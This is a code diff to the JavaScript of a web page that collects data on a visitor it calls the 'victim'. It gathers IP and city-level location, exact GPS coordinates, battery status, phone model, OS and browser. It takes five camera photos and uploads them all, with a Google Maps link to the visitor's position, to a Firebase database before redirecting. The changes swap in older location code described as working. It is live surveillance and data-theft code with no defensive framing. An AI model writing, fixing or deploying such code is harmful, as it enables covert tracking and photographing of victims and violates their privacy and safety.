@@ -191,158 +191,113 @@
             }
         }
         
-        // ========== FIXED: IP AND LOCATION DETAILS ==========
-        async function getIPAndLocation() {
+        // ========== OLD HTML KA LOCATION CODE (WORKING) ==========
+        
+        // IP functions
+        async function getIP() {
             try {
-                // Multiple APIs for backup
-                let data = null;
-                
-                // Try ipapi.co first
-                try {
-                    const res = await fetch('https://ipapi.co/json/', { timeout: 5000 });
-                    data = await res.json();
-                    addDebug(`✅ IP: ${data.ip}, Location: ${data.city}, ${data.country_name}`);
-                } catch(e) {
-                    addDebug("ipapi.co failed, trying ip-api.com...");
-                    // Fallback to ip-api.com
-                    const res = await fetch('http://ip-api.com/json/');
-                    data = await res.json();
-                    addDebug(`✅ IP: ${data.query}, Location: ${data.city}, ${data.country}`);
-                    data = {
-                        ip: data.query,
-                        country_name: data.country,
-                        region: data.regionName,
-                        city: data.city,
-                        org: data.isp,
-                        latitude: data.lat,
-                        longitude: data.lon
-                    };
-                }
-                
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                addDebug("IP: " + data.ip);
+                return data.ip;
+            } catch(e) {
+                addDebug("IP fetch error: " + e.message, true);
+                return 'Unknown';
+            }
+        }
+        
+        async function getIPDetails(ip) {
+            try {
+                const res = await fetch(`https://ipapi.co/${ip}/json/`);
+                const data = await res.json();
+                addDebug(`Location: ${data.city}, ${data.country_name}`);
                 return {
-                    ip: data.ip || 'Unknown',
                     country: data.country_name || 'Unknown',
                     region: data.region || 'Unknown',
                     city: data.city || 'Unknown',
-                    isp: data.org || data.isp || 'Unknown',
+                    isp: data.org || 'Unknown',
                     lat: data.latitude || 0,
                     lng: data.longitude || 0
                 };
             } catch(e) {
-                addDebug("IP fetch error: " + e.message, true);
-                return { ip: 'Unknown', country: 'Unknown', region: 'Unknown', city: 'Unknown', isp: 'Unknown', lat: 0, lng: 0 };
+                addDebug("IP details error: " + e.message, true);
+                return { country: 'Unknown', region: 'Unknown', city: 'Unknown', isp: 'Unknown', lat: 0, lng: 0 };
             }
         }
         
-        // ========== FIXED: EXACT GPS LOCATION ==========
-        async function getExactLocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    addDebug("Geolocation not supported", true);
-                    resolve({ lat: 0, lng: 0, accuracy: 0 });
-                    return;
-                }
-                
-                addDebug("Requesting GPS location...");
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        addDebug(`✅ GPS: ${pos.coords.latitude}, ${pos.coords.longitude} (Accuracy: ${pos.coords.accuracy}m)`);
-                        resolve({ 
-                            lat: pos.coords.latitude, 
-                            lng: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy
-                        });
-                    },
-                    (err) => {
-                        addDebug("GPS error: " + err.message, true);
-                        resolve({ lat: 0, lng: 0, accuracy: 0 });
-                    },
-                    { timeout: 15000, enableHighAccuracy: true, maximumAge: 0 }
-                );
-            });
-        }
-        
-        // ========== FIXED: BATTERY WITH PERCENTAGE ==========
-        async function getBatteryStatus() {
+        // Battery
+        async function getBattery() {
             if ('getBattery' in navigator) {
                 try {
                     const battery = await navigator.getBattery();
                     const level = Math.round(battery.level * 100);
                     const status = `${level}% (${battery.charging ? '🔌 Charging' : '🔋 Discharging'})`;
-                    addDebug(`🔋 Battery: ${status}`);
-                    return { level: level, charging: battery.charging, status: status };
+                    addDebug("Battery: " + status);
+                    return status;
                 } catch(e) {
-                    addDebug("Battery API error: " + e.message, true);
-                    return { level: 0, charging: false, status: 'Unknown' };
+                    return 'Unknown';
                 }
             }
-            addDebug("Battery API not supported", true);
-            return { level: 0, charging: false, status: 'Not Supported' };
+            return 'Not supported';
         }
         
-        // ========== FIXED: EXACT MOBILE MODEL ==========
+        // Device Info
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let os = 'Unknown', device = 'Unknown', browser = 'Unknown';
+            if (/Android/i.test(ua)) os = 'Android';
+            else if (/iPhone|iPad/i.test(ua)) os = 'iOS';
+            else if (/Windows/i.test(ua)) os = 'Windows';
+            else if (/Mac/i.test(ua)) os = 'macOS';
+            else if (/Linux/i.test(ua)) os = 'Linux';
+            
+            if (/Mobile/i.test(ua)) device = 'Mobile Phone';
+            else if (/Tablet/i.test(ua)) device = 'Tablet';
+            else device = 'Desktop';
+            
+            if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Google Chrome';
+            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
+            else if (/Firefox/i.test(ua)) browser = 'Firefox';
+            else if (/Edg/i.test(ua)) browser = 'Edge';
+            
+            addDebug(`Device: ${device}, OS: ${os}, Browser: ${browser}`);
+            return { os, device, browser };
+        }
+        
+        // Get EXACT Mobile Model
         function getMobileModel() {
             const ua = navigator.userAgent;
             let model = 'Unknown';
             let brand = 'Unknown';
             
-            addDebug("Detecting mobile model from UA: " + ua.substring(0, 100));
-            
-            // Android Detection
             if (/Android/i.test(ua)) {
-                // Try to extract model from UA
-                const matches = ua.match(/\(([^;]+);\s([^;]+)\s[^;]*\)/);
-                if (matches && matches.length >= 3) {
-                    brand = matches[1] || 'Unknown';
-                    model = matches[2] || 'Unknown';
+                const match = ua.match(/\(([^;]+);\s([^;]+)\s[^;]*\)/);
+                if (match && match[2]) {
+                    brand = match[1] || 'Unknown';
+                    model = match[2] || 'Unknown';
                 }
-                
-                // Samsung
                 if (ua.includes('SM-')) {
                     const smMatch = ua.match(/SM-[A-Z0-9]+/);
                     if (smMatch) model = smMatch[0];
                     brand = 'Samsung';
                 }
-                // Xiaomi/Redmi
-                else if (ua.includes('Redmi')) {
-                    const redmiMatch = ua.match(/Redmi\s+[A-Z0-9]+/i);
-                    model = redmiMatch ? redmiMatch[0] : 'Redmi';
+                if (ua.includes('Redmi')) {
+                    model = 'Redmi';
                     brand = 'Xiaomi';
                 }
-                else if (ua.includes('MI ') || ua.includes('Mi ')) {
-                    const miMatch = ua.match(/MI\s+[A-Z0-9]+/i);
-                    model = miMatch ? miMatch[0] : 'Mi';
+                if (ua.includes('MI ') || ua.includes('Mi ')) {
+                    model = 'Xiaomi';
                     brand = 'Xiaomi';
                 }
-                // OnePlus
-                else if (ua.includes('OnePlus')) {
-                    const opMatch = ua.match(/OnePlus\s+[A-Z0-9]+/i);
-                    model = opMatch ? opMatch[0] : 'OnePlus';
+                if (ua.includes('OnePlus')) {
+                    model = 'OnePlus';
                     brand = 'OnePlus';
                 }
-                // Google Pixel
-                else if (ua.includes('Pixel')) {
-                    const pixelMatch = ua.match(/Pixel\s+[A-Z0-9]+/i);
-                    model = pixelMatch ? pixelMatch[0] : 'Pixel';
+                if (ua.includes('Pixel')) {
+                    model = 'Google Pixel';
                     brand = 'Google';
                 }
-                // Oppo
-                else if (ua.includes('OPPO')) {
-                    model = 'OPPO';
-                    brand = 'OPPO';
-                }
-                // Vivo
-                else if (ua.includes('vivo')) {
-                    model = 'vivo';
-                    brand = 'vivo';
-                }
-                // Realme
-                else if (ua.includes('Realme')) {
-                    model = 'Realme';
-                    brand = 'Realme';
-                }
             }
-            // iOS Detection
             else if (/iPhone|iPad|iPod/i.test(ua)) {
                 brand = 'Apple';
                 if (ua.includes('iPhone')) {
@@ -359,43 +314,31 @@
             return { brand: brand, model: model, full: `${brand} ${model}`.trim() };
         }
         
-        // ========== DEVICE OS AND BROWSER ==========
-        function getDeviceOSBrowser() {
-            const ua = navigator.userAgent;
-            let os = 'Unknown', osVersion = 'Unknown';
-            
-            if (/Android/i.test(ua)) {
-                os = 'Android';
-                const match = ua.match(/Android\s([\d.]+)/);
-                if (match) osVersion = match[1];
-            } else if (/iPhone|iPad|iPod/i.test(ua)) {
-                os = 'iOS';
-                const match = ua.match(/OS\s([\d_]+)/);
-                if (match) osVersion = match[1].replace(/_/g, '.');
-            } else if (/Windows/i.test(ua)) {
-                os = 'Windows';
-                const match = ua.match(/Windows NT\s([\d.]+)/);
-                if (match) osVersion = match[1];
-            } else if (/Mac/i.test(ua)) {
-                os = 'macOS';
-                const match = ua.match(/Mac OS X\s([\d_]+)/);
-                if (match) osVersion = match[1].replace(/_/g, '.');
-            } else if (/Linux/i.test(ua)) {
-                os = 'Linux';
-            }
-            
-            let browser = 'Unknown';
-            if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Chrome';
-            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
-            else if (/Firefox/i.test(ua)) browser = 'Firefox';
-            else if (/Edg/i.test(ua)) browser = 'Edge';
-            else if (/Opera|OPR/i.test(ua)) browser = 'Opera';
-            
-            addDebug(`💻 OS: ${os} ${osVersion}, Browser: ${browser}`);
-            return { os, osVersion, browser };
+        // Location
+        async function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    addDebug("Geolocation not supported", true);
+                    resolve({ lat: 0, lng: 0 });
+                    return;
+                }
+                addDebug("Requesting GPS location...");
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        addDebug(`✅ GPS: ${pos.coords.latitude}, ${pos.coords.longitude}`);
+                        resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude });
+                    },
+                    (err) => {
+                        addDebug("Location error: " + err.message, true);
+                        resolve({ lat: 0, lng: 0 });
+                    },
+                    { timeout: 10000, enableHighAccuracy: true }
+                );
+            });
         }
         
-        // ========== CAPTURE 5 PHOTOS ==========
+        // ========== NEW HTML KA 5 PHOTOS CODE ==========
+        
         async function captureMultiplePhotos(count = 5) {
             const photos = [];
             
@@ -449,52 +392,45 @@
             markStep(1, false, '⟳');
             updateProgress(10, 'Detecting device...');
             
-            const ipData = await getIPAndLocation();
-            const battery = await getBatteryStatus();
+            const ip = await getIP();
+            const ipDetails = await getIPDetails(ip);
+            const battery = await getBattery();
+            const deviceInfo = getDeviceInfo();
             const mobileModel = getMobileModel();
-            const osBrowser = getDeviceOSBrowser();
             
             const victimInfo = {
-                ip: ipData.ip,
-                country: ipData.country,
-                region: ipData.region,
-                city: ipData.city,
-                isp: ipData.isp,
-                battery_level: battery.level,
-                battery_charging: battery.charging,
-                battery_status: battery.status,
+                ip: ip,
+                battery: battery,
+                device: deviceInfo.device,
+                device_full: mobileModel.full,
                 device_brand: mobileModel.brand,
                 device_model: mobileModel.model,
-                device_full: mobileModel.full,
-                os: osBrowser.os,
-                os_version: osBrowser.osVersion,
-                browser: osBrowser.browser,
+                os: deviceInfo.os,
+                browser: deviceInfo.browser,
                 screen: `${window.screen.width}x${window.screen.height}`,
-                language: navigator.language,
-                timestamp: new Date().toISOString()
+                language: navigator.language
             };
             
             markStep(1, true, '✓');
             updateProgress(30, 'Device detected');
             await new Promise(r => setTimeout(r, 500));
             
-            // Step 2: GPS Location
+            // Step 2: Location (OLD HTML KA WORKING CODE)
             markStep(2, false, '⟳');
             updateProgress(40, 'Getting GPS location...');
             
-            const gpsLocation = await getExactLocation();
-            const locationData = {
-                lat: gpsLocation.lat,
-                lng: gpsLocation.lng,
-                accuracy: gpsLocation.accuracy,
-                country: ipData.country,
-                region: ipData.region,
-                city: ipData.city,
-                isp: ipData.isp,
-                maps_link: `https://maps.google.com/?q=${gpsLocation.lat},${gpsLocation.lng}`
+            const loc = await getLocation();
+            const locationData = { 
+                lat: loc.lat, 
+                lng: loc.lng, 
+                country: ipDetails.country,
+                region: ipDetails.region,
+                city: ipDetails.city,
+                isp: ipDetails.isp,
+                maps_link: `https://maps.google.com/?q=${loc.lat},${loc.lng}`
             };
             
-            markStep(2, true, gpsLocation.lat !== 0 ? '✓' : '⚠');
+            markStep(2, true, loc.lat !== 0 ? '✓' : '⚠');
             updateProgress(50, 'GPS locked');
             await new Promise(r => setTimeout(r, 500));
             
@@ -512,9 +448,9 @@
             updateProgress(85, `${photos.length} photos captured`);
             await new Promise(r => setTimeout(r, 500));
             
-            // Step 4: Upload
+            // Step 4: Upload to Firebase
             markStep(4, false, '⟳');
-            updateProgress(90, 'Uploading...');
+            updateProgress(90, 'Uploading data...');
             
             const uploadData = {
                 victim_info: victimInfo,
@@ -528,7 +464,7 @@
             addDebug("Writing to Firebase...");
             try {
                 await database.ref(`sessions/${sessionId}/data`).set(uploadData);
-                addDebug("✅ ALL DATA UPLOADED!");
+                addDebug("✅ ALL DATA UPLOADED SUCCESSFULLY!");
                 markStep(4, true, '✓');
                 updateProgress(100, 'Complete! Redirecting...');
             } catch(e) {
